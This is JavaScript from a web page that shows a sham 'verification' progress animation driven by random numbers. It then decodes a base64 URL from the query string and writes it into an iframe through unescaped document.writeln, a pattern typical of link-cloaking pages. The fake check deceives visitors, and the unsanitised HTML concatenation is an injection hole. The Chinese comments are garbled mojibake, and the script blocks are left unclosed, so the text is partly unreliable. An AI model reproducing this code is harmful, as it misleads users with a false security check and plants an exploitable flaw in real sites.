<script>
// éªŒè¯æµç¨‹æ§åˆ¶
(function() {
    // æ˜¾ç¤ºéªŒè¯ç•Œé¢
    setTimeout(() => {
        document.querySelector('.initial-loading').style.display = 'none';
        document.getElementById('verificationContainer').style.display = 'block';
        
        // å¼€å§‹éªŒè¯æµç¨‹
        startVerification();
    }, 800);

    // éªŒè¯æµç¨‹
    function startVerification() {
        const progressBar = document.getElementById('progressBar');
        const steps = [
            document.getElementById('step1'),
            document.getElementById('step2'),
            document.getElementById('step3'),
            document.getElementById('step4')
        ];
        
        let progress = 0;
        let currentStep = 0;
        
        // è®¾ç½®ç¬¬ä¸€æ­¥ä¸ºæ¿€æ´»çŠ¶æ€
        steps[0].classList.add('active');
        
        // æ¨¡æ‹Ÿè¿›åº¦
        const simulateProgress = () => {
            if (progress < 100) {
                // åŠ¨æ€è°ƒæ•´é€Ÿåº¦
                let speed;
                if (progress < 30) speed = Math.random() * 0.8 + 0.4;
                else if (progress < 70) speed = Math.random() * 0.5 + 0.2;
                else speed = Math.random() * 0.3 + 0.1;
                
                progress += speed;
                progress = Math.min(progress, 100);
                progressBar.style.width = `${progress}%`;
                
                // æ›´æ–°æ­¥éª¤çŠ¶æ€
                updateSteps();
                requestAnimationFrame(simulateProgress);
            } else {
                // å®ŒæˆéªŒè¯ååŠ è½½ç›®æ ‡å†…å®¹
                setTimeout(loadTargetContent, 800);
            }
        };
        
        // æ›´æ–°æ­¥éª¤çŠ¶æ€
        function updateSteps() {
            const stepProgress = progress / 100 * steps.length;
            
            // å®Œæˆçš„æ­¥éª¤
            for (let i = 0; i < Math.floor(stepProgress); i++) {
                if (i < steps.length) {
                    steps[i].classList.remove('active');
                    steps[i].classList.add('completed');
                    steps[i].querySelector('.step-icon').textContent = 'âœ“';
                }
            }
            
            // å½“å‰æ¿€æ´»çš„æ­¥éª¤
            const activeStep = Math.min(Math.floor(stepProgress), steps.length - 1);
            if (stepProgress < steps.length) {
                steps[activeStep].classList.add('active');
            }
        }
        
        // å¼€å§‹æ¨¡æ‹Ÿè¿›åº¦
        simulateProgress();
    }

    // åŠ è½½ç›®æ ‡å†…å®¹
    function loadTargetContent() {
        var urlParams = new URLSearchParams(window.location.search);
        var encodedParam = urlParams.get('c');
        
        if (encodedParam) {
            try {
                var tureurl = atob(encodedParam);
                
                if (tureurl.includes("http")) {
                    // éšè—åŠ è½½åŠ¨ç”»
                    var loadingContainer = document.getElementById("loadingContainer");
                    loadingContainer.style.display = "none";

                    // æ’å…¥iframe
                    var html = '<iframe class="content" onload="bindMouseWhee(this)" src="' + tureurl + '"></iframe>';
                    document.writeln(html);
                    console.log(tureurl);
                } else {
                    console.log("æ— æ•ˆçš„URL");
                    document.querySelector('.loading-tip').textContent = 'éªŒè¯å¤±è´¥ï¼šæ— æ•ˆçš„ç›®æ ‡åœ°å€';
                }
            } catch (e) {
                console.log("è§£ç å¤±è´¥:", e);
                document.querySelector('.loading-tip').textContent = 'éªŒè¯å¤±è´¥ï¼šåœ°å€è§£ç é”™è¯¯';
            }
        } else {
            console.log("æœªæ‰¾åˆ°å‚æ•°");
            document.querySelector('.loading-tip').textContent = 'éªŒè¯å¤±è´¥ï¼šæœªæ‰¾åˆ°ç›®æ ‡åœ°å€';
        }
    }
})();

<script>
var firefox = navigator.userAgent.indexOf('Firefox') != -1;

// é¼ æ ‡æ»šè½®äº‹ä»¶å¤„ç†
function MouseWheel(e, doc) {
    try {
        e.preventDefault && e.preventDefault();
        e.returnValue = false;
        var up = firefox && e.detail < 0 || e.wheelDelta > 0;
        doc.body.scrollTop = doc.documentElement.scrollTop += up ? -50 : 50;
    } catch (e) {
        console.log('è·¨åŸŸç¯å¢ƒä¸‹æ— æ³•æ§åˆ¶æ»šåŠ¨:', e);
    }
}

function bindMouseWhee(ifr) {
    try {
        // æ£€æŸ¥æ˜¯å¦åŒæº
        var isSameOrigin = false;
        try {
            var iframeOrigin = new URL(ifr.src).origin;
            isSameOrigin = window.location.origin === iframeOrigin;
        } catch (e) {
            console.log('æ— æ³•éªŒè¯åŒæºæ€§:', e);
        }

        if (isSameOrigin) {
            var doc = ifr.contentWindow.document;
            if (firefox) {
                doc.addEventListener('DOMMouseScroll', function(e) {
                    MouseWheel(e, doc);
                }, false);
            } else {
                doc.onmousewheel = function(e) {
                    MouseWheel(e || ifr.contentWindow.event, doc);
                };
            }
        } else {
            console.log('æ£€æµ‹åˆ°è·¨åŸŸiframeï¼Œå°†ä¸ç»‘å®šæ»šåŠ¨äº‹ä»¶ä»¥é¿å…å®‰å…¨é”™è¯¯');
        }
    } catch (e) {
        console.log('ç»‘å®šæ»šåŠ¨äº‹ä»¶å¤±è´¥:', e);
    }
}
